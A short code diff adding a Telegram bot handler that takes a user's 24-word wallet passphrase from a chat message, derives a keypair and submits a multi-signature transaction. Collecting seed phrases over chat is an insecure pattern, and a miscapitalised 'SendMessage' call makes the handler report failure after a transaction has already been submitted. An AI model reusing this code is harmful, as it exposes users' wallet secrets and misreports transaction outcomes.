@@ -387,3 +387,33 @@ bot.on('message', async (msg) => {
         return bot.sendMessage(chatId, `❌ Unknown error occured`);
     }
 })
+
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+
+    if(userSessions[chatId]?.waitingForMultiSig) {
+            const passphrase = msg.text.trim().toLocaleLowerCase();
+            const words = passphrase.split(/\s+/);
+            if(words.length !== 24) {
+                return bot.sendMessage(chatId, '❌ Invalid passphrase. Please send exactly 24 words');
+            }
+
+            bot.sendMessage(chatId, '⏳ Multi signing...');
+
+            try {
+                const kp = getKeypairFromPassphrase(passphrase)
+                bot.sendMessage(chatId, `✅ Public key: ${kp.publicKey()}`);
+
+                const result = await buildAndSubmitMultiSigTx(passphrase);
+                bot.SendMessage(chatId, JSON.stringify(result));
+            } catch(error) {
+                bot.sendMessage(chatId, `❌ Something went wrong, please try again`);
+            }
+
+        
+
+        delete userSessions[chatId]
+    }
+})
+
+
